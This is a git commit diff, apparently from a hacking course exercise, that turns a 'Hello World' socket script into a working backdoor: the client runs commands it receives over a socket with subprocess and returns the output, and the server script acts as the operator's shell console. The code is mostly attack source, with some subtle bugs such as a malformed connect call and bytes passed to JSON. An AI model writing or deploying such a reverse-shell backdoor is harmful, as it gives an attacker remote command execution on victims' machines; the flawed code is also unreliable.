7b8d1058a4fa48910be2570fc9bd880333cf38ce
albert18 <erertech@gmail.com>
2022-12-22 20:11:42 +0300

    update

--- 5. Backdoor/backdoor.py
+++ 5. Backdoor/backdoor.py
@@ -1,8 +1,31 @@
 import socket 
+import json
+import subprocess
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+                break
+        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        result = execute.stdout.read() + execute.stderr.read()
+        reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1'), 5555)
-message = 'Hello World'
-s.send(message.encode())
+shell()
 
 
--- 5. Backdoor/server.py
+++ 5. Backdoor/server.py
@@ -1,11 +1,29 @@
 import socket
 import termcolor
+import json
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
 
 def target_communication():
-    message = target.recv(1024)
-    print(message.decode())
-
-
+    while True:
+        command = input('* Shell~%s: ' % str(ip))
+        reliable_send(command)
+        if command == 'quit':
+            break
+        result = reliable_recv()
+        print(result)
+    
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('127.0.0.1', 5555))
 print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
